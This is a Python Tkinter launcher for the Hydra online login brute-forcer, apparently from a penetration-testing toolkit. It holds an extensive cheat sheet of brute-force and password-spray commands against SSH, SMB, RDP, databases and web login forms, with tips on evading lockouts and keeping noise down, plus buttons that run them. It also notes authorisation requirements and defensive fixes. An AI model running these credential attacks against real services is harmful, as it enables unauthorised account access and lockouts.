#!/usr/bin/env python3

from tkinter import *
from datetime import datetime
import subprocess
import shlex
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from config import NAMES, WORDLIST
from config import WORKING_DIR

#Define variables outside functions here:

info = r'''

     ██╗  ██╗██╗   ██╗██████╗ ██████╗  █████╗
     ██║  ██║╚██╗ ██╔╝██╔══██╗██╔══██╗██╔══██╗
     ███████║ ╚████╔╝ ██║  ██║██████╔╝███████║
     ██╔══██║  ╚██╔╝  ██║  ██║██╔══██╗██╔══██║
     ██║  ██║   ██║   ██████╔╝██║  ██║██║  ██║
     ╚═╝  ╚═╝   ╚═╝   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝

THC-Hydra  -  fast parallel ONLINE login brute-forcer / password sprayer.

Throws username x password combos at a live network service or web login form
until one works.  Credential-access phase: turns "port 22 is open" or "there's
a /login page" into a working credential for initial access or lateral
movement.  Loud and lockout-prone - prefer a slow, wide spray to a deep brute.

when to use it
    - a service with password auth is exposed (SSH, FTP, RDP, SMB, MSSQL,
      MySQL, POP3/IMAP/SMTP, VNC, LDAP, SNMP, HTTP basic/form)
    - you have a candidate password (from OSINT, a breach dump, a policy guess)
      and a user list - spray it once across everyone
    - a web app login with no rate-limit / lockout and a stable failure string
    - yields: valid user:pass -> feed enum_netexec / exploit_impacket / ssh

Hydra
support FTP, SMB, SMB2, POP3, IMAP, MySQL, VNC, SSH

hydra -h #help

-C credfile.txt user:pass
		user2:pass2
-M .txt	    list of targets/IPs #dont forget servicename
-f          exit after the first found login/password pair (per host if -M)
-F          exit after the first found login/password pair for any host (for usage with -M)
-o FILE     write found login/password pairs to FILE instead of stdout
-v / -V     verbose mode / show login+pass combination for each attempt
-m 	    provide additional options
-t 4	    run TASKS number of connects in parallel per target (default: 16) #ssh config limit TASKS try 4

hydra -L users.txt -P pass.txt <service://server> <options> -t 4

hydra crackme.site http-post-form "/login.php:usr=^USER^&pwd=^PASS^:invalid credentials" -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/#pick password#.txt -f -V #usr and pwd variables from script to log in on website

cewl -w words.txt -m 4 www.site.com  #scrapes website for words of 4 and longer
hydra -L login_list.txt -P words.txt -e nsr -F www.site.com  #bruteforce website log in

hydra -U ssh #will show extra options required

hydra IP ssh -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Password/#pick password#.txt -f -V

hydra -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/#pick password#.txt telnet://192.168.99.22

hydra -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/#pick password#.txt 192.168.99.22 ssh

nmap --script smb-brute -p 445 IP
hydra -V -f -l #username# -P /opt/SKELETON/data/rockyou.txt 10.130.40.70 smb -t 1
hydra -l #username# -P /opt/SKELETON/data/rockyou.txt 10.130.40.70 smb
hydra -C creds.txt domain.com smb2 -m workgroup:{domain}

More formats:
hydra -L users.list -P passwords.list ssh://IP_address
                                      smb://IP_address
                                      ftp://IP_address

Modify password list:
grep -E "[a-z]" rockyou.txt | grep -E "[A-Z]" | grep -E "[0-9]" | grep -E "........" > newrockyou.txt  #passwords compliant to win default password policy

-U user:password format

grep domain.com credlist.txt | sed 's/@domain.com//' > userlist.txt  #delete @domain,com
                               sed 's/@.*//' > userlist.txt  #delete everything after @
automatic option is set to default, select y for automatic option and n for manual option:

more command recipes
    hydra -L users.txt -P rockyou.txt ssh://10.0.0.5 -t 4 -f -o hits.txt          # SSH, 4 tasks, stop on first
    hydra -l admin    -P rockyou.txt ftp://10.0.0.5 -V                             # FTP, single user, verbose
    hydra -L users.txt -p 'Winter2026!' smb://10.0.0.0/24 -t 1 -M targets.txt      # spray ONE pw wide, 1 task
    hydra -C combos.txt 10.0.0.5 mssql                                            # user:pass combo list
    hydra -l sa -P pw.txt 10.0.0.5 mssql -f                                       # MSSQL sa account
    hydra -l root -P pw.txt 10.0.0.5 mysql
    hydra -L users.txt -P pw.txt rdp://10.0.0.5 -t 1 -W 3                          # RDP: 1 task, 3s wait, lockout-safe
    hydra -L users.txt -P pw.txt 10.0.0.5 -s 2222 ssh                             # -s non-default port
    hydra -l admin -P pw.txt 10.0.0.5 -e nsr                                      # also try null / user=pass / reversed
    hydra -l bob -P pw.txt 10.0.0.5 ldap3://10.0.0.5 -t 1                          # LDAP simple bind
    hydra -L users.txt -P pw.txt 10.0.0.5 http-get /admin/                        # HTTP Basic auth
    hydra -l admin -P pw.txt 10.0.0.5 https-post-form \
        "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"                    # form, F= failure string
    hydra -l admin -P pw.txt 10.0.0.5 http-post-form \
        "/login:user=^USER^&pass=^PASS^:S=Location: /dashboard"                   # S= success condition instead
    hydra -l admin -P pw.txt 10.0.0.5 http-post-form \
        "/login:u=^USER^&p=^PASS^&csrf=TOKEN:H=Cookie: sess=abc:F=denied"         # extra header / static CSRF
    hydra ... -t 1 -w 5 -f                                                        # slowest / quietest profile
    hydra -R                                                                     # restore an interrupted session (hydra.restore)

pair with
    bruteforce_pw_inspector    cut rockyou down to the target policy first
    bruteforce_wordlist_gen    cewl the org site into a themed list
    bruteforce_kerbrute        do AD spraying there instead (no 4625 storm, lockout-aware)
    bruteforce_patator         when the success/failure check is too complex for hydra
    enum_netexec               validate any hit across SMB / WinRM / LDAP estate-wide
    web_ffuf / web_dirb        find the login endpoint and its parameters first

gotchas / de-conflict
    - AD accounts lock (default 5 bad tries / 30 min) - a multi-password run
      against a domain user list WILL cause a lockout storm; spray one password,
      wait out the window, repeat
    - SSH: MaxStartups / PAM throttling means -t 4 or lower; higher just drops
      connections and produces false negatives
    - http-post-form: get the failure/success string EXACTLY (capture a real bad
      login first); wrong string = every attempt "succeeds" or none do
    - CSRF tokens / rotating nonces defeat static form strings - use patator or a
      scripted approach
    - RDP module is unreliable vs NLA - use bruteforce_crowbar for those
    - every attempt is logged (4625 / auth.log / web access log) and trivially
      alertable

authorisation & reporting
    Active, intrusive, noisy and capable of denial-of-service via lockout.
    Requires explicit written sign-off, a named target/service list, a time
    window, and an agreed lockout threshold.  Notify the SOC or you will burn
    the engagement's stealth budget.
    Report the fix: MFA on all external auth, account lockout + monitoring,
    rate-limiting / CAPTCHA on web logins, disable unused services, move admin
    interfaces behind VPN, ban breached/weak passwords.

hydra spray & json api authentication
  single password spray across userlist:
    hydra -L users.txt -p 'Spring2026!' -u -t 1 10.10.10.10 ssh

  json post authentication:
    hydra 10.10.10.10 http-post-form "/api/login:{\"user\":\"^USER^\",\"pass\":\"^PASS^\"}:H=Content-Type: application/json:F=false" -l admin -P pass.txt
'''

#GUI

#Creates $guibox window to populate all the gui
guibox = Tk()
guibox.title('bruteforce_hydra  —  Hydra - online login brute force')   #window title: tool name + purpose
guibox.geometry("950x900")   #size for the window guibox


#Define functions

def NEW_Terminal():
    subprocess.call(["gnome-terminal"])

def LOG(cmd):
    current_time = datetime.now()
    current_time_value = "\n" + "Time stamp: " + current_time.strftime("%d-%b-%Y (%H:%M:%S.%f)") + " - " + cmd + "\n"
    text_box.insert('end', current_time_value)
    text_box.yview('end')


def RUN_in_terminal(cmd):
    subprocess.call(['gnome-terminal -- bash -c ' + shlex.quote(cmd + ' ; exec bash')], shell=True)
    LOG(cmd)

def RUN_hydra_custom():
    ip = ip_entry.get().strip() or "10.10.10.10"
    switch = switch_entry.get()
    if userlist_var.get() == 1:
        userlist = "-L " + shlex.quote(str(NAMES))
    else:
        userlist = "-l " + shlex.quote(user_entry.get().strip() or "admin")
    wlist = shlex.quote(wordlist_entry.get().strip() or str(WORDLIST))
    outfile = shlex.quote(str(WORKING_DIR / (os.path.basename(outfile_entry.get().strip()) or "hydra_out")))
    cmd = "hydra " + userlist + " -P " + wlist + " -o " + outfile + " " + switch + " " + shlex.quote(ip)
    RUN_in_terminal(cmd)

def RUN_hydra_spray():
    ip = ip_entry.get().strip() or "10.10.10.10"
    switch = switch_entry.get()
    if userlist_var.get() == 1:
        userlist = "-L " + shlex.quote(str(NAMES))
    else:
        userlist = "-l " + shlex.quote(user_entry.get().strip() or "admin")
    spray_pass = shlex.quote(spraypass_entry.get().strip() or "Spring2026!")
    outfile = shlex.quote(str(WORKING_DIR / (os.path.basename(outfile_entry.get().strip()) or "hydra_out")))
    cmd = "hydra " + userlist + " -p " + spray_pass + " -u -t 1 -o " + outfile + " " + switch + " " + shlex.quote(ip)
    RUN_in_terminal(cmd)

def RUN_hydra_nsr():
    ip = ip_entry.get().strip() or "10.10.10.10"
    switch = switch_entry.get()
    if userlist_var.get() == 1:
        userlist = "-L " + shlex.quote(str(NAMES))
    else:
        userlist = "-l " + shlex.quote(user_entry.get().strip() or "admin")
    outfile = shlex.quote(str(WORKING_DIR / (os.path.basename(outfile_entry.get().strip()) or "hydra_out")))
    cmd = "hydra " + userlist + " -e nsr -o " + outfile + " " + switch + " " + shlex.quote(ip)
    RUN_in_terminal(cmd)

def RUN_hydra():
    userlist = '-L ' + shlex.quote(str(NAMES)) if userlist_var.get() == 1 else '-l ' + shlex.quote(user_entry.get())
    cmd = 'hydra ' + shlex.quote(ip_entry.get()) + ' ' + userlist + ' -P ' + shlex.quote(str(WORDLIST)) + ' ' + switch_entry.get()
    subprocess.call(['gnome-terminal -- bash -c ' + shlex.quote(cmd + ' ; exec bash')], shell = True)
    LOG(cmd)


#Grid Frames
frame_main = Frame(guibox)
frame_main.grid(row=0, column=0, columnspan=1, padx=5, pady=0, sticky="nsew")
guibox.rowconfigure(0, weight=1)
guibox.columnconfigure(0, weight=1)
frame_main.rowconfigure(1, weight=1)
frame_main.columnconfigure(0, weight=1)

frame_message = Frame(frame_main)
frame_message.grid(row=1, column=0, columnspan=1, padx=5, pady=5, sticky="nsew")

frame_buttons1 = Frame(frame_main)
frame_buttons1.grid(row=2, column=0, columnspan=8, padx=5, pady=0)

frame_buttons2 = Frame(frame_main)
frame_buttons2.grid(row=3, column=0, columnspan=8, padx=5, pady=0)

frame_buttons3 = Frame(frame_main)
frame_buttons3.grid(row=4, column=0, columnspan=8, padx=5, pady=0)

#interface
text_box = Text(
    frame_message,
    height=45,
    width=115
)
text_box.grid(row=1)

text_box.insert('end', info)
text_box.pack(side=LEFT, fill=BOTH, expand=True)
text_box.yview('1.0')

sb = Scrollbar(frame_message)
sb.pack(side=RIGHT, fill=BOTH)

text_box.config(yscrollcommand=sb.set)
sb.config(command=text_box.yview)

ip_label = Label(frame_buttons1, text="Target IP: ")
ip_label.grid(row=0, column=0, padx=5, pady=5)
ip_entry = Entry(frame_buttons1, width=20)
ip_entry.grid(row=0, column=1, padx=5, pady=5)
ip_entry.insert(0, os.environ.get("SKELETON_TARGET", '10.10.10.10'))

switch_label = Label(frame_buttons1, text="Switches ex ftp -f -V : ")
switch_label.grid(row=1, column=0, padx=5, pady=5)
switch_entry = Entry(frame_buttons1, width=30)
switch_entry.grid(row=1, column=1, padx=5, pady=5)
switch_entry.insert(0, 'ssh -f -V')

user_label = Label(frame_buttons1, text="User name: ")
user_label.grid(row=2, column=0, padx=5, pady=5)
user_entry = Entry(frame_buttons1, width=20)
user_entry.grid(row=2, column=1, padx=5, pady=5)
user_entry.insert(0, os.environ.get("SKELETON_USER", 'admin'))

userlist_var = IntVar(guibox)
userlist_check = Checkbutton(frame_buttons2, text="USE user list " + str(NAMES), variable=userlist_var, onvalue=1, offvalue=0)
userlist_check.grid(row=0, column=0, padx=5, pady=5)

RUN_hydra_button = Button(frame_buttons3, text=" RUN hydra ", command=RUN_hydra)
RUN_hydra_button.grid(row=0, column=0, padx=5, pady=5)

NEW_button = Button(frame_buttons3, text=" NEW Terminal ", command=NEW_Terminal)
NEW_button.grid(row=0, column=1, padx=5, pady=5)


wordlist_label = Label(frame_buttons2, text="Wordlist: ")
wordlist_label.grid(row=1, column=0, padx=5, pady=4, sticky='e')
wordlist_entry = Entry(frame_buttons2, width=34)
wordlist_entry.grid(row=1, column=1, padx=5, pady=4)
wordlist_entry.insert(0, os.environ.get("SKELETON_WORDLIST", str(WORDLIST)))

spraypass_label = Label(frame_buttons2, text="Password: ")
spraypass_label.grid(row=2, column=0, padx=5, pady=4, sticky='e')
spraypass_entry = Entry(frame_buttons2, width=34)
spraypass_entry.grid(row=2, column=1, padx=5, pady=4)
spraypass_entry.insert(0, os.environ.get("SKELETON_PASS", "Spring2026!"))

outfile_label = Label(frame_buttons2, text="Save-file name (no spaces): ")
outfile_label.grid(row=3, column=0, padx=5, pady=4, sticky='e')
outfile_entry = Entry(frame_buttons2, width=34)
outfile_entry.grid(row=3, column=1, padx=5, pady=4)
outfile_entry.insert(0, "hydra_out")

HYDRA_custom_btn = Button(frame_buttons3, text=" RUN hydra (wordlist + -o) ", command=RUN_hydra_custom)
HYDRA_custom_btn.grid(row=2, column=2, padx=5, pady=5)

HYDRA_spray_btn = Button(frame_buttons3, text=" RUN spray (-p single pass) ", command=RUN_hydra_spray)
HYDRA_spray_btn.grid(row=2, column=3, padx=5, pady=5)

HYDRA_nsr_btn = Button(frame_buttons3, text=" RUN blank/same (-e nsr) ", command=RUN_hydra_nsr)
HYDRA_nsr_btn.grid(row=2, column=4, padx=5, pady=5)

guibox.mainloop()   #generates guibox window
